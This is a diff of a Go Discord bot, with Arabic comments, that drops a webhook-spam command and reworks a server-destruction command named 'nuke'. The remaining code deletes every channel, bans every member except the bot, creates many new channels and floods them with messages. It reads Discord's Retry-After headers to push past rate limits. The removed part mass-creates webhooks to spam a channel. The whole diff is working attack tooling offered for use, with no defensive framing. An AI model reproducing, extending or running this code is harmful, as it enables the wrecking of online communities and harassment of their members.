@@ -39,42 +39,10 @@ func main() {
 
 	sess.Identify.Intents = discordgo.IntentsAll
 
-	cmdWhSpam := "wh_spam"
-	commandWhSpam := &discordgo.ApplicationCommand{
-		Name:        cmdWhSpam,
-		Description: "سبام ويب هوك فائق السرعة",
-		Options: []*discordgo.ApplicationCommandOption{
-			{
-				Type:        discordgo.ApplicationCommandOptionChannel,
-				Name:        "channel",
-				Description: "الروم المستهدف",
-				Required:    true,
-			},
-			{
-				Type:        discordgo.ApplicationCommandOptionString,
-				Name:        "message_content",
-				Description: "محتوى الرسالة",
-				Required:    true,
-			},
-			{
-				Type:        discordgo.ApplicationCommandOptionString,
-				Name:        "webhook_name",
-				Description: "اسم الويب هوك",
-				Required:    true,
-			},
-			{
-				Type:        discordgo.ApplicationCommandOptionInteger,
-				Name:        "messages_count",
-				Description: "عدد الرسائل الإجمالي المطلوب",
-				Required:    true,
-			},
-		},
-	}
-
-	cmdDestroy := "destroy_server"
-	commandDestroy := &discordgo.ApplicationCommand{
-		Name:        cmdDestroy,
-		Description: "أمر تدمير السيرفر الخارق",
+	cmdNuke := "nuke"
+	commandNuke := &discordgo.ApplicationCommand{
+		Name:        cmdNuke,
+		Description: "أمر التدمير الشامل الخارق",
 		Options: []*discordgo.ApplicationCommandOption{
 			{
 				Type:        discordgo.ApplicationCommandOptionString,
@@ -85,13 +53,13 @@ func main() {
 			{
 				Type:        discordgo.ApplicationCommandOptionInteger,
 				Name:        "rooms_count",
-				Description: "عدد الرومات",
+				Description: "عدد الرومات المراد إنشاؤها",
 				Required:    true,
 			},
 			{
 				Type:        discordgo.ApplicationCommandOptionString,
 				Name:        "message_content",
-				Description: "محتوى الرسالة",
+				Description: "محتوى الرسالة التي ستُرسل",
 				Required:    true,
 			},
 			{
@@ -119,35 +87,11 @@ func main() {
 			return
 		}
 
-		cmdName := i.ApplicationCommandData().Name
-
-		if cmdName == cmdWhSpam {
+		if i.ApplicationCommandData().Name == cmdNuke {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "🚀 جاري تنفيذ سبام الويب هوك الفائق...",
-					Flags:   discordgo.MessageFlagsEphemeral,
-				},
-			})
-
-			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
-			for _, opt := range i.ApplicationCommandData().Options {
-				optionMap[opt.Name] = opt
-			}
-
-			channelID := optionMap["channel"].ChannelValue(s).ID
-			messageContent := optionMap["message_content"].StringValue()
-			webhookName := optionMap["webhook_name"].StringValue()
-			messagesCount := int(optionMap["messages_count"].IntValue())
-
-			go runWebhookSpamLoop(token, channelID, webhookName, messageContent, messagesCount, s)
-
-		} else if cmdName == cmdDestroy {
-			// رد فوري للمشرف بأن عملية التجهيز بدأت
-			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-				Type: discordgo.InteractionResponseChannelMessageWithSource,
-				Data: &discordgo.InteractionResponseData{
-					Content: "⚡ جاري تجهيز الهجوم الخارق (3 ثواني للتحضير)...",
+					Content: "⚡ جاري تحضير الهجوم الشامل (3 ثواني للتحضير بالذاكرة)...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -162,8 +106,9 @@ func main() {
 			messageContent := optionMap["message_content"].StringValue()
 			messagesCount := int(optionMap["messages_count"].IntValue())
 			guildID := i.GuildID
+			botID := s.State.User.ID
 
-			go executeDestructionWithWarmup(token, guildID, roomName, roomsCount, messageContent, messagesCount, s)
+			go executeTotalNuke(token, guildID, botID, roomName, roomsCount, messageContent, messagesCount, s)
 		}
 	})
 
@@ -173,9 +118,8 @@ func main() {
 		return
 	}
 
-	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandWhSpam)
-	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandDestroy)
-	fmt.Println("🤖 البوت شغال الآن وجاهز للسرعة القصوى!")
+	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandNuke)
+	fmt.Println("🤖 بوت التدمير الشامل شغال وجاهز!")
 
 	stop := make(chan os.Signal, 1)
 	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
@@ -184,177 +128,14 @@ func main() {
 	sess.Close()
 }
 
-func runWebhookSpamLoop(token, channelID, webhookName, messageContent string, totalGoal int, s *discordgo.Session) {
-	sentCounter := 0
-	var mu sync.Mutex
-	webhookCount := 25
-
-	for {
-		mu.Lock()
-		if sentCounter >= totalGoal {
-			mu.Unlock()
-			break
-		}
-		mu.Unlock()
-
-		urls := createWebhooks(token, channelID, webhookName, webhookCount)
-		if len(urls) == 0 {
-			time.Sleep(30 * time.Millisecond)
-			continue
-		}
-
-		burstSendFast(urls, messageContent, &sentCounter, totalGoal, &mu)
-		deleteWebhooks(token, urls)
-	}
-}
-
-func createWebhooks(token, channelID, webhookName string, count int) []string {
+func executeTotalNuke(token, guildID, botID, roomName string, roomsCount int, messageContent string, messagesCount int, s *discordgo.Session) {
 	headers := map[string]string{
 		"Authorization": "Bot " + token,
 		"Content-Type":  "application/json",
 		"User-Agent":    "DiscordBot (https://discord.com, v10)",
 	}
 
-	payload, _ := json.Marshal(map[string]string{"name": webhookName})
-	var activeURLs []string
-	var mu sync.Mutex
-	var wg sync.WaitGroup
-
-	for i := 0; i < count; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			req, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/webhooks", bytes.NewBuffer(payload))
-			for k, v := range headers {
-				req.Header.Set(k, v)
-			}
-
-			resp, err := httpClient.Do(req)
-			if err != nil {
-				return
-			}
-			defer resp.Body.Close()
-
-			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
-				var wh map[string]interface{}
-				if err := json.NewDecoder(resp.Body).Decode(&wh); err == nil {
-					if id, ok := wh["id"].(string); ok {
-						if tkn, ok := wh["token"].(string); ok {
-							url := fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tkn)
-							mu.Lock()
-							activeURLs = append(activeURLs, url)
-							mu.Unlock()
-						}
-					}
-				}
-			}
-		}()
-	}
-	wg.Wait()
-	return activeURLs
-}
-
-func deleteWebhooks(token string, urls []string) {
-	headers := map[string]string{
-		"Authorization": "Bot " + token,
-		"User-Agent":    "DiscordBot (https://discord.com, v10)",
-	}
-
-	var wg sync.WaitGroup
-	for _, url := range urls {
-		wg.Add(1)
-		go func(whURL string) {
-			defer wg.Done()
-			delReq, _ := http.NewRequest("DELETE", whURL, nil)
-			for k, v := range headers {
-				delReq.Header.Set(k, v)
-			}
-			if resp, err := httpClient.Do(delReq); err == nil {
-				resp.Body.Close()
-			}
-		}(url)
-	}
-	wg.Wait()
-}
-
-func burstSendFast(urls []string, messageContent string, sentCounter *int, totalGoal int, mu *sync.Mutex) {
-	stopSignal := make(chan struct{})
-	var wg sync.WaitGroup
-	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
-
-	for _, url := range urls {
-		wg.Add(1)
-		go func(whURL string) {
-			defer wg.Done()
-			for {
-				select {
-				case <-stopSignal:
-					return
-				default:
-				}
-
-				mu.Lock()
-				if *sentCounter >= totalGoal {
-					mu.Unlock()
-					return
-				}
-				mu.Unlock()
-
-				req, _ := http.NewRequest("POST", whURL, bytes.NewBuffer(msgPayload))
-				req.Header.Set("Content-Type", "application/json")
-				req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")
-
-				resp, err := httpClient.Do(req)
-				if err != nil {
-					continue
-				}
-
-				if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
-					mu.Lock()
-					*sentCounter++
-					mu.Unlock()
-				} else if resp.StatusCode == 429 {
-					retryAfterStr := resp.Header.Get("Retry-After")
-					resp.Body.Close()
-					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
-						time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
-					} else {
-						time.Sleep(5 * time.Millisecond)
-					}
-					continue
-				}
-				resp.Body.Close()
-			}
-		}(url)
-	}
-
-	for {
-		mu.Lock()
-		if *sentCounter >= totalGoal {
-			mu.Unlock()
-			close(stopSignal)
-			break
-		}
-		mu.Unlock()
-		time.Sleep(1 * time.Millisecond)
-	}
-
-	wg.Wait()
-}
-
-func executeDestructionWithWarmup(token, guildID, roomName string, roomsCount int, messageContent string, messagesCount int, s *discordgo.Session) {
-	headers := map[string]string{
-		"Authorization": "Bot " + token,
-		"Content-Type":  "application/json",
-		"User-Agent":    "DiscordBot (https://discord.com, v10)",
-	}
-
-	// ==========================================
-	// مرحلة التحضير الخارق (3 ثواني في الذاكرة)
-	// ==========================================
-	fmt.Println("⚡ جاري تحضير الـ Payloads وسحب الأعضاء والقنوات...")
-
-	// 1. تجهيز بيانات إنشاء الرومات مسبقاً في الذاكرة
+	// 1. تجهيز بايلودات الرومات مسبقاً
 	channelPayloads := make([][]byte, roomsCount)
 	for i := 0; i < roomsCount; i++ {
 		p, _ := json.Marshal(map[string]interface{}{
@@ -364,10 +145,10 @@ func executeDestructionWithWarmup(token, guildID, roomName string, roomsCount in
 		channelPayloads[i] = p
 	}
 
-	// 2. تجهيز محتوى الرسائل مسبقاً
+	// 2. تجهيز بايلود الرسائل
 	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
 
-	// 3. سحب لستة الأعضاء دفعة واحدة وتخزين الـ IDs بالذاكرة
+	// 3. سحب الأعضاء بالـ Pagination واستثناء البوت
 	var allUserIDs []string
 	after := ""
 	for {
@@ -377,7 +158,9 @@ func executeDestructionWithWarmup(token, guildID, roomName string, roomsCount in
 		}
 		for _, m := range members {
 			if m != nil && m.User != nil {
-				allUserIDs = append(allUserIDs, m.User.ID)
+				if m.User.ID != botID {
+					allUserIDs = append(allUserIDs, m.User.ID)
+				}
 				after = m.User.ID
 			}
 		}
@@ -386,7 +169,7 @@ func executeDestructionWithWarmup(token, guildID, roomName string, roomsCount in
 		}
 	}
 
-	// 4. جلب القنوات القديمة وتخزينها للذف الفوري
+	// 4. جلب القنوات القديمة
 	var oldChannelIDs []string
 	reqCh, err := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
 	if err == nil {
@@ -406,31 +189,44 @@ func executeDestructionWithWarmup(token, guildID, roomName string, roomsCount in
 		}
 	}
 
-	// انتظار انتهاء الـ 3 ثواني بالضبط لتكتمل كل عمليات التحضير والتهيئة بالذاكرة
+	// انتهاء الـ 3 ثواني للتحضير
 	time.Sleep(3 * time.Second)
-	fmt.Println("🚀 تم الانتهاء من التحضير.. إطلاق الهجوم الآن!")
 
-	// ==========================================
-	// مرحلة الإطلاق الخارق (تنفيذ فوري بدون أي تأخير)
-	// ==========================================
-
-	// أ. حذف القنوات القديمة دفعة واحدة
+	// أ. حذف القنوات القديمة (مع قراءة وقت الـ Retry-After بدقة)
 	var wgDel sync.WaitGroup
 	for _, id := range oldChannelIDs {
 		wgDel.Add(1)
 		go func(chID string) {
 			defer wgDel.Done()
-			delReq, _ := http.NewRequest("DELETE", "https://discord.com/api/v10/channels/"+chID, nil)
-			for k, v := range headers {
-				delReq.Header.Set(k, v)
-			}
-			if r, e := httpClient.Do(delReq); e == nil {
-				r.Body.Close()
+			delURL := "https://discord.com/api/v10/channels/" + chID
+			for {
+				delReq, _ := http.NewRequest("DELETE", delURL, nil)
+				for k, v := range headers {
+					delReq.Header.Set(k, v)
+				}
+
+				resp, err := httpClient.Do(delReq)
+				if err != nil {
+					return
+				}
+
+				if resp.StatusCode == 429 {
+					retryAfterStr := resp.Header.Get("Retry-After")
+					resp.Body.Close()
+					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
+						time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
+					} else {
+						time.Sleep(100 * time.Millisecond)
+					}
+					continue
+				}
+				resp.Body.Close()
+				break
 			}
 		}(id)
 	}
 
-	// ب. حظر جميع الأعضاء دفعة واحدة وبأقصى سرعة
+	// ب. حظر الأعضاء (مع قراءة وقت الـ Retry-After بدقة واستثناء البوت)
 	var wgBan sync.WaitGroup
 	for _, userID := range allUserIDs {
 		wgBan.Add(1)
@@ -454,7 +250,7 @@ func executeDestructionWithWarmup(token, guildID, roomName string, roomsCount in
 					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
 						time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
 					} else {
-						time.Sleep(10 * time.Millisecond)
+						time.Sleep(100 * time.Millisecond)
 					}
 					continue
 				}
@@ -464,7 +260,7 @@ func executeDestructionWithWarmup(token, guildID, roomName string, roomsCount in
 		}(userID)
 	}
 
-	// ج. إنشاء الرومات الجديدة دفعة واحدة باستخدام البيانات الجاهزة مسبقاً
+	// ج. إنشاء الرومات الجديدة (مع قراءة وقت الـ Retry-After بدقة)
 	var newChannelIDs []string
 	var muChannels sync.Mutex
 	var wgCreate sync.WaitGroup
@@ -490,7 +286,7 @@ func executeDestructionWithWarmup(token, guildID, roomName string, roomsCount in
 					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
 						time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
 					} else {
-						time.Sleep(10 * time.Millisecond)
+						time.Sleep(100 * time.Millisecond)
 					}
 					continue
 				}
@@ -512,7 +308,7 @@ func executeDestructionWithWarmup(token, guildID, roomName string, roomsCount in
 	}
 	wgCreate.Wait()
 
-	// د. إرسال الرسائل فوراً بكل الرومات الجديدة دفعة واحدة
+	// د. إرسال الرسائل بكل روم جديد بالتوازي (مع قراءة وقت الـ Retry-After بدقة)
 	var wgMsg sync.WaitGroup
 	for _, chID := range newChannelIDs {
 		wgMsg.Add(1)
@@ -541,7 +337,7 @@ func executeDestructionWithWarmup(token, guildID, roomName string, roomsCount in
 							if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
 								time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
 							} else {
-								time.Sleep(5 * time.Millisecond)
+								time.Sleep(100 * time.Millisecond)
 							}
 							continue
 						}
@@ -554,6 +350,9 @@ func executeDestructionWithWarmup(token, guildID, roomName string, roomsCount in
 		}(chID)
 	}
 
+	// انتظار انتهاء كافة العمليات بالكامل
 	wgDel.Wait()
+	wgBan.Wait()
 	wgMsg.Wait()
+	fmt.Println("✅ انتهت عملية التدمير الشامل بالكامل وبأقصى سرعة!")
 }
